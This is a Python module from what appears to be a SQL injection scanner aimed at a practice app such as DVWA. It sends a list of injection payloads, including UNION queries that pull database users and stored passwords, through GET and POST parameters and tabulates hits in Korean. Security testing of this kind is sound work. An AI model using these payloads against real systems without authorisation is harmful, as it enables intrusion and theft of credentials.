import requests
from bs4 import BeautifulSoup
from urllib.parse import quote_plus
from rich.console import Console
from rich.table import Table

console = Console()

def run(soup, headers, find_path_dic, security_level):
    sql_payload = [
        "1'OR'1'='1",
        "1'UNION SELECT 1,2",
        "1'UNION SELECT 1,2%23",
        "1'UNION SELECT database(),user()%23",
        "1'/**/OR/**/1=1%23",
        "1 UNION SELECT user,password FROM users#",
        "1' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()#"
    ]

    result_tables = []

    for param_dic in find_path_dic:
        param_url = param_dic['url']
        param_method = param_dic['method'].lower()
        param_list = param_dic['param']

        if 'sqli_blind' in param_url or 'sqli' not in param_url:
            continue

        for payload in sql_payload:
            encoded_payload = quote_plus(payload)

            if param_method == 'get' and security_level == 'low':
                pay_url = param_url + "?"
                for param in param_list:
                    if param.lower() != 'submit':
                        pay_url += f"{param}={encoded_payload}&"
                pay_url += "Submit=Submit"

                res = requests.get(pay_url, headers=headers)
                if f"ID: {payload}" in res.text:
                    table = Table(show_lines=True)
                    table.add_column("항목", style="white", justify="center")
                    table.add_column("내용", style="white", justify="center")
                    table.add_row("URL", param_url)
                    table.add_row("VULN NAME", "SQL Injection (GET)")
                    table.add_row("Payload", payload)
                    result_tables.append(table)

            elif param_method == 'post':
                data = {}
                for param in param_list:
                    if param.lower() == "submit":
                        data[param] = "submit"
                    else:
                        data[param] = payload

                if security_level == 'medium':
                    res = requests.post(param_url, headers=headers, data=data)
                    if f"ID: {payload}" in res.text:
                        table = Table(show_lines=True)
                        table.add_column("항목", style="white", justify="center")
                        table.add_column("내용", style="white", justify="center")
                        table.add_row("URL", param_url)
                        table.add_row("VULN NAME", "SQL Injection (POST)")
                        table.add_row("Payload", payload)
                        result_tables.append(table)

                elif security_level == 'high':
                    if "session-input" not in param_url:
                        continue
                    base_url = param_url.replace('session-input.php', '')
                    requests.post(param_url, headers=headers, data=data)
                    get_res = requests.get(base_url, headers=headers)
                    if f"ID: {payload}" in get_res.text:
                        table = Table(show_lines=True)
                        table.add_column("항목", style="white", justify="center")
                        table.add_column("내용", style="white", justify="center")
                        table.add_row("URL", param_url)
                        table.add_row("VULN NAME", "SQL Injection (HIGH)")
                        table.add_row("Payload", payload)
                        result_tables.append(table)

    if not result_tables:
        console.print("[!] 탐지된 SQL Injection 취약점이 없습니다.", style="bold red")
        return "[!] 탐지된 SQL Injection 취약점이 없습니다."

    console.print("\n[italic bold white]\n{:^60}\n[/italic bold white]".format("SQL Injection 탐지 결과"))
    for table in result_tables:
        console.print(table)

    return "[✓] 탐지된 SQL Injection 결과 출력 완료."
